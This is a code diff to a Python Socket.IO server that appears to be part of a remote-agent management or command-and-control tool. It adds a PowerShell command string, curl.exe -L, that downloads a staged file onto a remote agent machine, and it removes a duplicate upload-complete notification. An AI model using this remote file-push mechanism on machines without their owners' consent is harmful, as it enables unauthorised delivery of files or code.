@@ -4344,6 +4344,10 @@ def upload_file_pscurl(agent_id):
             dst_dir = ''
         dst_sep = '\\' if (dst_dir and (dst_dir.startswith('\\') or ':' in dst_dir)) else '/'
         download_path = (dst_dir + (dst_sep if not dst_dir.endswith(dst_sep) and dst_dir != '' else '')) + safe_name if dst_dir else safe_name
+        # Build PowerShell command string for diagnostics
+        _u = file_url.replace("'", "''")
+        _p = download_path.replace("'", "''")
+        ps_cmd = f"$u='{_u}'; $p='{_p}'; curl.exe -L $u -o $p"
         # Ask agent to download via PowerShell curl with progress
         try:
             socketio.emit('ps_curl_download', {
@@ -4356,11 +4360,8 @@ def upload_file_pscurl(agent_id):
             }, room=agent_sid)
         except Exception:
             pass
-        # Notify operator
+        # Notify operator (progress only). Avoid duplicate success notifications.
         try:
-            payload = {'agent_id': agent_id, 'upload_id': upload_id, 'filename': safe_name, 'staged_url': file_url, 'destination_path': download_path, 'command': ps_cmd, 'source': 'server'}
-            if operator_sid:
-                socketio.emit('file_upload_complete', payload, room=operator_sid)
             socketio.emit('file_upload_progress', {'agent_id': agent_id, 'upload_id': upload_id, 'filename': safe_name, 'progress': 0, 'source': 'server'}, room='operators')
         except Exception:
             pass
